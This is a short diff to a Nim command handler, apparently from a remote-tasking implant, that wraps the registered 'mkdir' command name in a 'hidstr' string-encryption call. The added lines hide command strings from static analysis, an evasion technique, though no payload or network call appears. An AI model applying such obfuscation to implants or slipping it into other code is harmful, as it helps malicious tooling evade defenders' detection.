@@ -1,6 +1,7 @@
 import std/[os, json, strutils]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc mkdirExecute(taskId: string, params: JsonNode, state: AgentState,
                   send: SendMsg): TaskResult =
@@ -16,4 +17,4 @@ proc mkdirExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initMkdir*() =
-  register("mkdir", mkdirExecute)
+  register(hidstr("mkdir"), mkdirExecute)
